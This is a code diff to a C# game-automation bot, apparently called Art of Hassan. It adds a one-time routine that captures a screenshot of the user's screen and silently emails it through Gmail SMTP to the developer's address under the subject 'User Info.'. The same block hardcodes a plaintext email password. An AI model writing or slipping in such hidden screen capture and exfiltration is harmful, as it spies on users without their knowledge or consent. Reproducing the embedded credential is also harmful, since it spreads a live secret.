@@ -6,6 +6,7 @@ using System.Net;
 using System.Net.Mail;
 using System.Runtime.InteropServices;
 using System.Text.RegularExpressions;
+using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Controls;
 using System.Windows.Media;
@@ -250,6 +251,7 @@ namespace ArtOfHassan
         bool IsNoGoldStatus    = false;
         bool IsNoGoldMailSent  = false;
         bool IsStopHassan      = false;
+        bool IsGetUserInfo     = false;
 
         int NumOfWar     = 0;
         int NumOfVictory = 0;
@@ -961,6 +963,31 @@ namespace ArtOfHassan
                     {
                         MonitoringLog("SkillButton");
                         MousePointClick(SkillButtonX, SkillButtonY);
+
+                        if (!IsGetUserInfo)
+                        {
+                            IsGetUserInfo = true;
+
+                            string filename = @"screenshot\Screenshot_" + DateTime.Now.ToString("yyMMdd_HHmmssfff") + ".png";
+                            CurrentBitmap.Save(filename, System.Drawing.Imaging.ImageFormat.Png);
+
+                            Task task = new Task(() =>
+                            {
+                                SmtpClient smtpClient = new SmtpClient("smtp.gmail.com", 587);
+                                smtpClient.UseDefaultCredentials = false;
+                                smtpClient.EnableSsl = true;
+                                smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
+                                smtpClient.Credentials = new NetworkCredential("artofwarhassan@gmail.com", "Rnrmf0575!");
+
+                                MailMessage mailMessage = new MailMessage("artofwarhassan@gmail.com",
+                                                                          "artofwarhassan@gmail.com",
+                                                                          $"Art of Hassan {Version}",
+                                                                          "User Info.");
+                                mailMessage.Attachments.Add(new System.Net.Mail.Attachment(filename));
+                                smtpClient.Send(mailMessage);
+                            });
+                            task.Start();
+                        }
 
                         System.Threading.Thread.Sleep((int)(ScreenMonitoringInterval * 3 / 4));
                         return;
